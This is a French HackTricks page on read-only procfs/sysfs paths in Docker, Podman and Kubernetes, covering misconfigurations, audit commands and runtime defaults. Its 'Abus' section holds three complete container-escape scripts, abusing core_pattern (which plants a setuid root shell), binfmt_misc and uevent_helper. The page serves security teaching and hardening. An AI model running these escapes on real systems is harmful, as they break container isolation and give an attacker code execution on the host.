# Chemins système en lecture seule

{{#include ../../../../banners/hacktricks-training.md}}

Les chemins système en lecture seule constituent une protection distincte des chemins masqués. Au lieu de masquer complètement un chemin, le runtime l'expose, mais le monte en lecture seule. Cette pratique est courante pour certains emplacements procfs et sysfs, où l'accès en lecture peut être acceptable ou nécessaire au fonctionnement, mais où les écritures seraient trop dangereuses.

L'objectif est simple : de nombreuses interfaces du kernel deviennent beaucoup plus dangereuses lorsqu'elles sont accessibles en écriture. Un montage en lecture seule ne supprime pas toute valeur de reconnaissance, mais il empêche une workload compromise de modifier les fichiers sous-jacents exposés au kernel via ce chemin.

## Fonctionnement

Les runtimes marquent fréquemment certaines parties de la vue proc/sys comme étant en lecture seule. Selon le runtime et l'hôte, cela peut inclure des chemins tels que :

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La liste exacte varie, mais le modèle reste le même : autoriser la visibilité lorsque cela est nécessaire et refuser les modifications par défaut.

## Lab

Inspectez la liste des chemins en lecture seule déclarée par Docker :
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspectez la vue proc/sys montée depuis l’intérieur du conteneur :
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impact sur la sécurité

Les chemins système en lecture seule limitent une grande catégorie d’abus susceptibles d’affecter l’hôte. Même lorsqu’un attaquant peut inspecter procfs ou sysfs, l’impossibilité d’y écrire supprime de nombreux chemins de modification directe impliquant les paramètres du kernel, les gestionnaires de crash, les helpers de chargement de modules ou d’autres interfaces de contrôle. L’exposition n’a pas disparu, mais le passage de la divulgation d’informations à l’influence sur l’hôte devient plus difficile.

## Erreurs de configuration

Les principales erreurs consistent à démasquer ou à remonter des chemins sensibles en lecture-écriture, à exposer directement le contenu de proc/sys de l’hôte au moyen de bind mounts inscriptibles, ou à utiliser des modes privilégiés qui contournent effectivement les paramètres par défaut plus sûrs du runtime. Dans Kubernetes, `procMount: Unmasked` et les workloads privilégiés vont souvent de pair avec une protection plus faible de proc. Une autre erreur opérationnelle courante consiste à supposer que, puisque le runtime monte généralement ces chemins en lecture seule, tous les workloads héritent encore de ce paramètre par défaut.

## Abus

Si la protection est faible, commencez par rechercher les entrées proc/sys accessibles en écriture :
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Lorsque des entrées inscriptibles sont présentes, les pistes de suivi à forte valeur incluent :
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Ce que ces commandes peuvent révéler :

- Des entrées accessibles en écriture sous `/proc/sys` signifient souvent que le container peut modifier le comportement du kernel de l’hôte, plutôt que simplement l’inspecter.
- `core_pattern` est particulièrement important, car une valeur accessible en écriture exposée à l’hôte peut être transformée en voie d’exécution de code sur l’hôte en faisant crasher un processus après avoir configuré un pipe handler.
- `modprobe` révèle l’helper utilisé par le kernel pour les opérations liées au chargement des modules ; c’est une cible classique à forte valeur lorsqu’il est accessible en écriture.
- `binfmt_misc` indique si l’enregistrement d’interpréteurs personnalisés est possible. Si l’enregistrement est accessible en écriture, cela peut devenir une primitive d’exécution, plutôt qu’un simple information leak.
- `panic_on_oom` contrôle une décision du kernel concernant l’ensemble de l’hôte et peut donc transformer l’épuisement des ressources en déni de service de l’hôte.
- `uevent_helper` est l’un des exemples les plus clairs d’un chemin d’helper sysfs accessible en écriture permettant une exécution dans le contexte de l’hôte.

Les découvertes intéressantes incluent des knobs proc ou des entrées sysfs exposés à l’hôte et accessibles en écriture, alors qu’ils devraient normalement être en lecture seule. À ce stade, le workload est passé d’une vue limitée du container à une influence significative sur le kernel.

### Exemple complet : Évasion de l’hôte avec `core_pattern`

Si `/proc/sys/kernel/core_pattern` est accessible en écriture depuis l’intérieur du container et pointe vers la vue du kernel de l’hôte, il peut être exploité pour exécuter un payload après un crash :
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si le chemin atteint réellement le kernel de l'host, le payload s'exécute sur l'host et laisse derrière lui un shell setuid.

### Exemple complet : enregistrement de `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture, l'enregistrement d'un interpréteur personnalisé peut permettre l'exécution de code lorsque le fichier correspondant est exécuté :
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Avec un `binfmt_misc` inscriptible et exposé à l’hôte, le résultat est une exécution de code dans le chemin de l’interpréteur déclenché par le kernel.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est inscriptible, le kernel peut invoquer un helper situé sur l’hôte lorsqu’un événement correspondant est déclenché :
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La raison pour laquelle cela est si dangereux est que le chemin de l’helper est résolu du point de vue du système de fichiers de l’hôte, plutôt que depuis un contexte sûr limité au container.

## Vérifications

Ces vérifications déterminent si l’exposition de procfs/sysfs est en lecture seule comme prévu et si la workload peut toujours modifier des interfaces sensibles du kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Ce qui est intéressant ici :

- Un workload normal et hardened devrait exposer très peu d'entrées proc/sys inscriptibles.
- Les chemins `/proc/sys` inscriptibles sont souvent plus importants qu'un simple accès en lecture.
- Si le runtime indique qu'un chemin est en lecture seule, mais qu'il est effectivement inscriptible, examinez attentivement la propagation des montages, les bind mounts et les paramètres de privilèges.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Docker définit une liste de chemins en lecture seule par défaut pour les entrées proc sensibles | exposition des montages proc/sys de l'hôte, `--privileged` |
| Podman | Activé par défaut | Podman applique les chemins en lecture seule par défaut, sauf s'ils sont explicitement assouplis | `--security-opt unmask=ALL`, montages larges de l'hôte, `--privileged` |
| Kubernetes | Hérite des valeurs par défaut du runtime | Utilise le modèle de chemins en lecture seule du runtime sous-jacent, sauf s'il est affaibli par les paramètres du Pod ou les montages de l'hôte | `procMount: Unmasked`, workloads privilégiés, montages proc/sys inscriptibles de l'hôte |
| containerd / CRI-O sous Kubernetes | Valeur par défaut du runtime | S'appuie généralement sur les valeurs par défaut de l'OCI/runtime | identique à la ligne Kubernetes ; les modifications directes de la configuration du runtime peuvent affaiblir ce comportement |

L'idée essentielle est que les chemins système en lecture seule sont généralement présents par défaut dans le runtime, mais qu'il est facile de les compromettre avec des modes privilégiés ou des bind mounts de l'hôte.
{{#include ../../../../banners/hacktricks-training.md}}
